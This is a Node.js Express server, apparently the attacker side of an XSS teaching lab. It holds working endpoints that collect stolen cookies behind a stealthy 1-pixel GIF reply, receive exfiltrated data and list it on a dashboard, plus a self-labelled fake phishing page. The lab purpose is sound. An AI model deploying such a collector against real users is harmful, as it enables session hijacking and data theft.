const express = require("express");
const path = require("path");
const cors = require("cors");

const app = express();
const PORT = 3002;

// Storage para los datos robados
const stolenData = {
  cookies: [],
  exfiltrated: [],
  redirects: [],
};

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static("public"));

// =====================================================
// ENDPOINTS DE ATAQUE
// =====================================================

// 🍪 Cookie Stealer - Recibe cookies robadas
app.get("/api/attacker/steal", (req, res) => {
  const { c } = req.query;
  const timestamp = new Date().toISOString();

  console.log("🍪 [COOKIE STOLEN]", { timestamp, cookie: c });

  stolenData.cookies.push({
    timestamp,
    cookie: c || "No cookie",
    userAgent: req.headers["user-agent"],
    referer: req.headers["referer"] || "Unknown",
  });

  // Respuesta de 1 pixel transparente para no alertar al usuario
  res.setHeader("Content-Type", "image/gif");
  res.send(
    Buffer.from(
      "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7",
      "base64"
    )
  );
});

// 📤 Data Exfiltration - Recibe datos exfiltrados
app.post("/api/attacker/exfil", (req, res) => {
  const timestamp = new Date().toISOString();

  console.log("📤 [DATA EXFILTRATED]", { timestamp, data: req.body });

  stolenData.exfiltrated.push({
    timestamp,
    data: req.body,
    userAgent: req.headers["user-agent"],
    referer: req.headers["referer"] || "Unknown",
  });

  res.json({ success: true, message: "Data received" });
});

// 🔀 Phishing Page
app.get("/phishing", (req, res) => {
  const timestamp = new Date().toISOString();

  console.log("🔀 [REDIRECT TRACKED]", { timestamp });

  stolenData.redirects.push({
    timestamp,
    userAgent: req.headers["user-agent"],
    referer: req.headers["referer"] || "Unknown",
  });

  res.send(`
    <!DOCTYPE html>
    <html lang="es">
    <head>
      <meta charset="UTF-8">
      <title>Login - Sitio Falso</title>
      <style>
        body {
          font-family: Arial, sans-serif;
          display: flex;
          justify-content: center;
          align-items: center;
          min-height: 100vh;
          margin: 0;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        .container {
          background: white;
          padding: 2rem;
          border-radius: 10px;
          box-shadow: 0 10px 40px rgba(0,0,0,0.2);
          max-width: 400px;
          width: 100%;
        }
        h1 {
          color: #e74c3c;
          margin-bottom: 1rem;
        }
        .warning {
          background: #fff3cd;
          border: 2px solid #ffc107;
          padding: 1rem;
          border-radius: 5px;
          margin-bottom: 1rem;
        }
        input {
          width: 100%;
          padding: 0.8rem;
          margin: 0.5rem 0;
          border: 1px solid #ddd;
          border-radius: 5px;
          box-sizing: border-box;
        }
        button {
          width: 100%;
          padding: 0.8rem;
          background: #667eea;
          color: white;
          border: none;
          border-radius: 5px;
          cursor: pointer;
          font-size: 1rem;
        }
        .info {
          margin-top: 1rem;
          padding: 1rem;
          background: #f8f9fa;
          border-radius: 5px;
          font-size: 0.9rem;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>⚠️ Sitio de Phishing</h1>
        <div class="warning">
          <strong>ADVERTENCIA:</strong> Esta es una página falsa creada para demostración educativa.
        </div>
        <form>
          <input type="email" placeholder="Email" required>
          <input type="password" placeholder="Password" required>
          <button type="submit">Iniciar Sesión (FALSO)</button>
        </form>
        <div class="info">
          <p><strong>Qué pasó:</strong></p>
          <ul>
            <li>✅ XSS ejecutó JavaScript en tu navegador</li>
            <li>✅ Te redirigió a este sitio falso</li>
            <li>✅ El atacante registró tu visita</li>
            <li>❌ Si ingresaras credenciales, serían robadas</li>
          </ul>
        </div>
      </div>
    </body>
    </html>
  `);
});

// =====================================================
// DASHBOARD - Ver datos robados
// =====================================================

app.get("/api/attacker/dashboard", (req, res) => {
  res.json({
    summary: {
      totalCookies: stolenData.cookies.length,
      totalExfiltrations: stolenData.exfiltrated.length,
      totalRedirects: stolenData.redirects.length,
    },
    data: stolenData,
  });
});

// Limpiar datos (para testing)
app.post("/api/attacker/clear", (req, res) => {
  stolenData.cookies = [];
  stolenData.exfiltrated = [];
  stolenData.redirects = [];
  console.log("🧹 [DATA CLEARED]");
  res.json({ success: true, message: "Data cleared" });
});

// =====================================================
// INICIO DEL SERVIDOR
// =====================================================

app.listen(PORT, () => {
  console.log(`
╔════════════════════════════════════════════╗
║  🚨 ATTACKER SERVER RUNNING                ║
║                                            ║
║  Port: ${PORT}                                ║
║  URL:  http://localhost:${PORT}                ║
║                                            ║
║  📊 Dashboard: /api/attacker/dashboard     ║
║  🧹 Clear:     /api/attacker/clear         ║
╚════════════════════════════════════════════╝
  `);

  console.log("\n📡 Endpoints activos:");
  console.log("  • GET  /api/attacker/steal     - Cookie stealer");
  console.log("  • POST /api/attacker/exfil     - Data exfiltration");
  console.log("  • GET  /phishing               - Phishing page");
  console.log("  • GET  /api/attacker/dashboard - Ver datos robados");
  console.log("  • POST /api/attacker/clear     - Limpiar datos\n");
});
